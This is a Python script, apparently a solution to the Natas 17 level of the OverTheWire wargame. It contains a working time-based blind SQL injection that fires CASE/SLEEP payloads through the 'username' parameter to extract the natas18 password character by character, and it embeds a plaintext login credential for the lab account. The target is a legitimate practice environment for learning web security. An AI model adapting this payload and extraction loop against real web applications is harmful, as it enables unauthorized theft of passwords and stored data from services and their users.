import requests
import string
import re
import time

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = "http://%s.natas.labs.overthewire.org" % username
s = requests.Session()
r = s.get(url, auth = (username,password))


alphabet = string.ascii_letters + string.digits

discovered_username = ""

def sqli(res, usr, idx):
    for char in alphabet:
        tmp_usr = usr + char
        _ended = True
        payload = {
            "username": f'natas18" and (case when(substring(password,1 ,{idx}) = binary \'{tmp_usr}\') then sleep(1) end) -- -',
            "debug": ''
        }
        start_time = time.time()
        r = s.get(url, params=payload, auth=(username, password))
        elapsed = time.time() - start_time
        
        if elapsed > 1:
            _ended = False
            print(f"[+] Current : {tmp_usr}")
            sqli(res, tmp_usr, idx + 1)
            if idx != 1:
                break
    if _ended and usr != '':
        print(f"[+] Found! : {usr}")
        res.append(usr)

usernames = []
sqli(usernames, "", 1)
print(usernames)